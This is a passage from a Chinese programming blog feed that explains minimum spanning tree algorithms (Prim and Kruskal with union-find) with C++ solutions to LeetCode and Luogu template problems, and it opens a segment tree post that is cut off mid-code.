class="keyword">if</span>(g[j][minIndex] &lt; lowcost[j])</span><br><span class="line">            &#123;</span><br><span class="line">                lowcost[j] = g[j][minIndex];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Kruskal-算法"><a href="#Kruskal-算法" class="headerlink" title="Kruskal 算法"></a>Kruskal 算法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DisjoinSetUnion</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; f, rank;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="built_in">DisjoinSetUnion</span>(<span class="type">int</span> n)</span><br><span class="line">    &#123;</span><br><span class="line">        n = n;</span><br><span class="line">        rank.<span class="built_in">resize</span>(n, <span class="number">1</span>);</span><br><span class="line">        f.<span class="built_in">resize</span>(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            f[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找函数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x != f[x])</span><br><span class="line">        &#123;</span><br><span class="line">            f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并函数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">UnionSet</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> fx = <span class="built_in">find</span>(x), fy = <span class="built_in">find</span>(y);</span><br><span class="line">        <span class="keyword">if</span>(fx == fy)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(rank[fx] &lt; rank[fy])<span class="built_in">swap</span>(fx, fy);</span><br><span class="line">        rank[fx] += rank[fy];</span><br><span class="line">        f[fy] = fx;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义边</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span>&#123;</span><br><span class="line">    <span class="type">int</span> len, x, y;</span><br><span class="line">    <span class="built_in">edge</span>(<span class="type">int</span> len, <span class="type">int</span> x, <span class="type">int</span> y) : <span class="built_in">len</span>(len), <span class="built_in">x</span>(x), <span class="built_in">y</span>(y)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minCostConnectPoints</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> dist = [&amp;](<span class="type">int</span> x, <span class="type">int</span> y) -&gt; <span class="type">int</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(points[x][<span class="number">0</span>] - points[y][<span class="number">0</span>]) + <span class="built_in">abs</span>(points[x][<span class="number">1</span>] - points[y][<span class="number">1</span>]);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = points.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">DisjoinSetUnion <span class="title">dsu</span><span class="params">(n)</span></span>;</span><br><span class="line">        vector&lt;edge&gt; edges;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                edges.<span class="built_in">emplace_back</span>(<span class="built_in">dist</span>(i, j), i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将边排序</span></span><br><span class="line">        <span class="built_in">sort</span>(edges.<span class="built_in">begin</span>(), edges.<span class="built_in">end</span>(), [](<span class="type">const</span> <span class="keyword">auto</span>&amp; a, <span class="type">const</span> <span class="keyword">auto</span>&amp; b)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> a.len &lt; b.len;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历所有边，将每条边的两个端点进行union操作</span></span><br><span class="line">       <span class="comment">// ans记录路径和, num记录当前已经完成的边的个数，初始化为1</span></span><br><span class="line">        <span class="comment">// 当所有点都联通时需要n-1条边</span></span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>, num = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; [len, x, y] : edges)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 合并成功代表将两个连通集合并到一起了</span></span><br><span class="line">            <span class="keyword">if</span>(dsu.<span class="built_in">UnionSet</span>(x, y))</span><br><span class="line">            &#123;</span><br><span class="line">                ans += len;</span><br><span class="line">                num++;</span><br><span class="line">                <span class="comment">// 全部联通时退出</span></span><br><span class="line">                <span class="keyword">if</span>(num == n)<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="洛谷模板题"><a href="#洛谷模板题" class="headerlink" title="洛谷模板题"></a>洛谷模板题</h1><p><a href="https://www.luogu.com.cn/problem/P3366">P3366 【模板】最小生成树 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p><p><a href="https://www.bilibili.com/video/BV1mJ411S7BB/?spm_id_from=333.337.search-card.all.click&vd_source=a87fbd3945da4b0dcfade345051aeae4">【AgOHの数据结构】你真的了解链式前向星吗？_哔哩哔哩_bilibili</a></p><h2 id="prim算法-1"><a href="#prim算法-1" class="headerlink" title="prim算法"></a>prim算法</h2><h3 id="图的存储（链式前向星）"><a href="#图的存储（链式前向星）" class="headerlink" title="图的存储（链式前向星）"></a>图的存储（链式前向星）</h3><p>先开一个比较大的内存池，也就是e[maxm&lt;&lt;1],然后在这块空间里进行，tot代表最近的且未被使用的一块内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// head[i]是第i个点的邻接点</span></span><br><span class="line">ll head[maxn], tot;</span><br><span class="line"><span class="comment">// 无向图所以开两倍</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">edges</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// v代表当前点指向的点，w为权值， next代表当前点的下一个邻接点</span></span><br><span class="line">ll v, w, next;</span><br><span class="line">&#125;e[maxm &lt;&lt; <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addEage</span><span class="params">(ll u, ll v, ll w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 先根据一条边初始化一个节点</span></span><br><span class="line">e[tot].v = v;</span><br><span class="line">    e[tot].w = w;</span><br><span class="line">    <span class="comment">// 然后插入对应的位置</span></span><br><span class="line">    e[tot].next = head[u];</span><br><span class="line">    head[u] = tot++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/27/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-09%20190543.png" alt="屏幕截图 2023-12-09 190543"></p><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个极大值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf 0x7f7ff</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m, dist[<span class="number">5010</span>], head[<span class="number">5010</span>], ans, k;</span><br><span class="line"><span class="type">bool</span> vis[<span class="number">5010</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链式前向星存储（邻接表）</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v, next, w;</span><br><span class="line">&#125;edges[<span class="number">400010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">edges[++k].v = v;</span><br><span class="line">edges[k].w = w;</span><br><span class="line">edges[k].next = head[u];</span><br><span class="line">head[u] = k;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 全部设为最大值</span></span><br><span class="line"><span class="built_in">fill</span>(dist, dist + n + <span class="number">1</span>, inf);</span><br><span class="line">    <span class="comment">// 处理第一个点</span></span><br><span class="line">dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 从剩下的点中找出距离最短的点</span></span><br><span class="line"><span class="type">int</span> u = <span class="number">-1</span>, minn = inf;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!vis[i] &amp;&amp; dist[i] &lt; minn)</span><br><span class="line">&#123;</span><br><span class="line">u = i;</span><br><span class="line">minn = dist[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 没找到的情况</span></span><br><span class="line"><span class="keyword">if</span> (u == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 记录当前走过的点</span></span><br><span class="line">vis[u] = <span class="number">1</span>;</span><br><span class="line">ans += dist[u];</span><br><span class="line">        <span class="comment">// 更新剩下的distance</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = head[u]; i; i = edges[i].next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v = edges[i].v;</span><br><span class="line"><span class="keyword">if</span> (!vis[v] &amp;&amp; dist[v] &gt; edges[i].w)dist[v] = edges[i].w;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, c;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"><span class="built_in">add</span>(a, b, c);</span><br><span class="line"><span class="built_in">add</span>(b, a, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">prim</span>();</span><br><span class="line"><span class="keyword">if</span> (ans == <span class="number">-1</span>)cout &lt;&lt; <span class="string">&quot;orz&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="kruskal"><a href="#kruskal" class="headerlink" title="kruskal"></a>kruskal</h2><p>将所有边按权值排序为由小到大。</p><p>然后遍历每条边，在一个连通集中就跳过，不在就加入，ans加上这条边的权值，再用total记录点的个数，total &#x3D;&#x3D; n - 1时所有点都进去了，结束。如果最后total !&#x3D; n - 1，说明没有不联通，所以没有最小生成树。</p><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// u为当前边的起始点，v为终点，total记录点的个数</span></span><br><span class="line"><span class="type">int</span> n, m, u, v, total;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录所有边</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> start, to;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line">&#125;edges[<span class="number">2000005</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录祖先</span></span><br><span class="line"><span class="type">int</span> f[<span class="number">100000</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找祖先，并用了路径压缩</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (f[x] == x)<span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line"><span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体的数组排序函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(edge a, edge b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.val &lt; b.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 从小到大遍历每条边</span></span><br><span class="line">        <span class="comment">// 起点</span></span><br><span class="line">u = <span class="built_in">find</span>(edges[i].start);</span><br><span class="line">        <span class="comment">//终点</span></span><br><span class="line">v = <span class="built_in">find</span>(edges[i].to);</span><br><span class="line">        <span class="comment">// 已经在同一个连通集就跳过</span></span><br><span class="line"><span class="keyword">if</span> (u == v)<span class="keyword">continue</span>;</span><br><span class="line">ans += edges[i].val;<span class="comment">//不在同一个并查集里就加上</span></span><br><span class="line">        <span class="comment">// 合并两点</span></span><br><span class="line">f[u] = v;</span><br><span class="line">total++;</span><br><span class="line"><span class="keyword">if</span> (total == n - <span class="number">1</span>)<span class="keyword">break</span>;<span class="comment">// 已经形成了最小生成树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)f[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;edges[i].start, &amp;edges[i].to, &amp;edges[i].val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(edges + <span class="number">1</span>, edges + m + <span class="number">1</span>, cmp);</span><br><span class="line"><span class="built_in">kruskal</span>();</span><br><span class="line"><span class="keyword">if</span> (total != n - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;orz&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;leetcode&quot;&gt;&lt;a href=&quot;#leetcode&quot; class=&quot;headerlink&quot; title=&quot;leetcode&quot;&gt;&lt;/a&gt;leetcode&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;模板题&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://leetc</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="图" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    
    
    <category term="最小生成树" scheme="https://1xueyu1.github.io/tags/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>线段树</title>
    <link href="https://1xueyu1.github.io/2023/11/26/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    <id>https://1xueyu1.github.io/2023/11/26/%E7%BA%BF%E6%AE%B5%E6%A0%91/</id>
    <published>2023-11-26T02:37:35.000Z</published>
    <updated>2023-12-20T13:47:00.385Z</updated>
    
    <content type="html"><![CDATA[<h1 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h1><p><strong>参考文献</strong></p><p><a href="https://blog.csdn.net/weixin_45697774/article/details/104274713">线段树 从入门到进阶（超清晰，简单易懂）_线段树怎么写-CSDN博客</a></p><h2 id="简单线段树"><a href="#简单线段树" class="headerlink" title="简单线段树"></a>简单线段树</h2><p><strong>模板题</strong></p><p><a href="https://www.luogu.com.cn/problem/P3374">P3374 【模板】树状数组 1（单点修改&#x2F;区间查询）</a></p><p><a href="https://www.luogu.com.cn/problem/P3368">P3368 【模板】树状数组 2 （区间修改&#x2F;单点查询）</a></p><h3 id="树状数组的构建"><a href="#树状数组的构建" class="headerlink" title="树状数组的构建"></a>树状数组的构建</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> left, <span class="type">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">tree[i].left = left;</span><br><span class="line">tree[i].right = right;</span><br><span class="line"><span class="comment">// 到叶子节点</span></span><br><span class="line"><span class="keyword">if</span> (left == right)<span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 递归构建左右子树</span></span><br><span class="line"><span class="built_in">build</span>(i * <span class="number">2</span>, left, mid);</span><br><span class="line"><span class="built_in">build</span>(i * <span class="number">2</span> + <span class="number">1</span>, mid + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取数组的值给线段树赋值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tree[i].left == tree[i].right)</span><br><span class="line">&#123;</span><br><span class="line">tree[i].num = nums[tree[i].right];</span><br><span class="line"><span class="keyword">return</span> tree[i].num;</span><br><span class="line">&#125;</span><br><span class="line">tree[i].num = <span class="built_in">add</span>(i * <span class="number">2</span>) + <span class="built_in">add</span>(i * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> tree[i].num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="单点修改"><a href="#单点修改" class="headerlink" title="单点修改"></a>单点修改</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从i开始递归修改所有 包含 第dis位 的区间，都加上k</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_plus</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> dis, <span class="type">int</span> k)</span></span></span><br><span class="line"><span 